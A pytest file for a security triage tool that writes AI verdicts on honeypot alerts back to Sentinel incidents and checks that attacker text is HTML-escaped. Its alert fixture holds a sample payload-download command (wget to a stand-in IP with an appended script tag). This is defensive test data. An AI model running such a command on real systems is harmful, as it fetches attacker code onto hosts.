import pytest

from triage.report import render
from triage.store import Store
from triage.writeback import SentinelWriter, format_comment

ALERT = {"alert_id": "02-abc", "rule_id": "02_download_command", "rule_name": "Payload download command",
         "src_ip": "203.0.113.5", "first_seen": "2026-09-01T10:00:00.000000Z", "last_seen": "2026-09-01T10:01:00.000000Z",
         "evidence": {"Commands": ["wget http://198.51.100.1/x <script>"]}}
TRIAGE = {"verdict": "malicious", "severity": "critical", "confidence": 0.9,
          "attack_techniques": [{"id": "T1105", "name": "Ingress Tool Transfer"}],
          "summary": "Dropper <b>fetched</b> a payload.", "key_evidence": ["wget <x>"], "recommended_actions": ["block"],
          "escalate": True}
RESULT = {"alert_id": "02-abc", "case_id": "case-1", "triage": TRIAGE, "model_served": "claude-opus-5-5"}


def test_store_dedupes_only_successful_verdicts(tmp_path):
    store = Store(tmp_path / "soc.db")
    store.save(ALERT, {"ip": {}}, {"alert_id": "02-abc", "triage": None, "error": "API error 529"})
    assert store.triaged_ids(["02-abc"]) == set()  # failures retry next cycle
    store.save(ALERT, {"ip": {}}, RESULT)
    assert store.triaged_ids(["02-abc", "other"]) == {"02-abc"}
    assert [p["alert"]["alert_id"] for p in store.pending_writeback()] == ["02-abc"]
    store.mark_written_back("02-abc", "comment")
    assert store.pending_writeback() == []
    record = next(store.records())
    assert record["writeback"] == "comment" and record["result"]["triage"]["severity"] == "critical"
    assert store.stats()["escalated"] == 1


class FakeArm:
    def __init__(self, incidents, entities, status="New"):
        self.incidents, self.entities, self.status = incidents, entities, status
        self.calls = []

    def list(self, path, params=None):
        self.calls.append(("LIST", path, params))
        return self.incidents

    def request(self, method, path, body=None, params=None, ok=None):
        self.calls.append((method, path, body))
        if path.endswith("/entities"):
            return {"entities": [{"kind": "Ip", "properties": {"address": ip}} for ip in self.entities]}
        if method == "GET":
            return {"etag": '"1"', "properties": {"title": "Cowrie - Payload download command", "status": self.status,
                                                    "severity": "High", "labels": [{"labelName": "keep", "labelType": "User"}]}}
        return {}


INCIDENT = {"id": "/subs/x/incidents/inc1", "name": "inc1",
            "properties": {"createdTimeUtc": "2026-09-01T10:05:00Z", "title": "Cowrie - Payload download command"}}


def writer(mode, entities=("203.0.113.5",), status="New"):
    arm = FakeArm([INCIDENT], list(entities), status)
    return SentinelWriter("/subs/x/ws", mode=mode, arm=arm), arm


def test_comment_mode_only_comments():
    w, arm = writer("comment")
    assert w.apply(ALERT, RESULT) == "comment"
    puts = [c for c in arm.calls if c[0] == "PUT"]
    assert len(puts) == 1 and "/comments/" in puts[0][1]
    assert "&lt;b&gt;fetched" in puts[0][2]["properties"]["message"]  # attacker/model text is escaped
    filt = arm.calls[0][2]["$filter"]
    assert "properties/title eq 'Cowrie - Payload download command'" in filt


def test_comment_id_is_deterministic():
    w1, a1 = writer("comment")
    w2, a2 = writer("comment")
    w1.apply(ALERT, RESULT)
    w2.apply(ALERT, RESULT)
    assert [c[1] for c in a1.calls if c[0] == "PUT"] == [c[1] for c in a2.calls if c[0] == "PUT"]


def test_update_mode_sets_severity_and_tags():
    w, arm = writer("update")
    assert w.apply(ALERT, RESULT) == "updated"
    body = [c for c in arm.calls if c[0] == "PUT" and c[1] == INCIDENT["id"]][0][2]
    assert body["etag"] == '"1"' and body["properties"]["severity"] == "High"
    labels = {lbl["labelName"] for lbl in body["properties"]["labels"]}
    assert labels == {"keep", "ai-triaged", "ai-verdict:malicious"}
    assert body["properties"]["status"] == "New"


@pytest.mark.parametrize("verdict,escalate,expected", [("benign", False, "closed"), ("benign", True, "updated"),
                                                       ("malicious", False, "updated")])
def test_close_mode_only_closes_benign_non_escalated(verdict, escalate, expected):
    w, arm = writer("close")
    result = {**RESULT, "triage": {**TRIAGE, "verdict": verdict, "escalate": escalate, "severity": "informational"}}
    assert w.apply(ALERT, result) == expected
    body = [c for c in arm.calls if c[0] == "PUT" and c[1] == INCIDENT["id"]][0][2]
    assert (body["properties"]["status"] == "Closed") == (expected == "closed")


def test_no_matching_incident():
    w, arm = writer("update", entities=("198.51.100.99",))
    assert w.apply(ALERT, RESULT) == "no-incident"
    assert not [c for c in arm.calls if c[0] == "PUT"]


def test_already_closed_incident_is_not_reopened():
    w, _ = writer("close", status="Closed")
    assert w.apply(ALERT, RESULT).startswith("comment")


def test_report_escapes_and_orders():
    benign = {"alert": {**ALERT, "alert_id": "03-b", "src_ip": "10.0.0.5"},
              "result": {"alert_id": "03-b", "triage": {**TRIAGE, "verdict": "benign", "severity": "informational",
                                                         "escalate": False}}}
    error = {"alert": {**ALERT, "alert_id": "04-c", "src_ip": "192.0.2.9"},
             "result": {"alert_id": "04-c", "triage": None, "error": "refused (category: cyber)"}}
    page = render([benign, {"alert": ALERT, "result": RESULT}, error])
    # The attacker's "<script>" in the evidence is escaped; the only real script tag is the report's own.
    assert page.count("<script>") == 1 and "&lt;script&gt;" in page
    assert page.index('data-flag="error"') < page.index('data-flag="escalate"') < page.index('data-flag="benign"')
    assert "refused (category: cyber)" in page
